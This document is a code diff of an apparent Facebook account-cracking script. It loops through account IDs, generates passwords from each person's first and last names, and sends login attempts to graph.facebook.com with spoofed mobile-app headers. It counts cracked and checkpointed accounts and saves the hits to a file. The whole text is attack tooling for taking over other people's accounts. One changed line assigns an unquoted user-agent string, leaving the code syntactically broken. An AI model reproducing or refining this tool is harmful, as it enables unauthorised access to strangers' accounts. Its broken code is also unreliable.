@@ -266,11 +266,10 @@ def method():
     apps='y'
     os.system("clear")
     print(logo) 
-    print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait Nd See ")
-    print(f"{oo('•')}//sdcard/Live-OK.txt")
-    print('\033[1;93m='*25)
+    print(f"{oo('•')}//sdcard/R4FSAN-FILE-OK.txt")
+    print('\033[1;93m_'*50)
     print()
     
     def start(user):
@@ -288,7 +287,7 @@ def method():
         sys.stdout.write('\r\033[1;91m[\033[1;97mR4FSAN-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = None
+            heads = Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
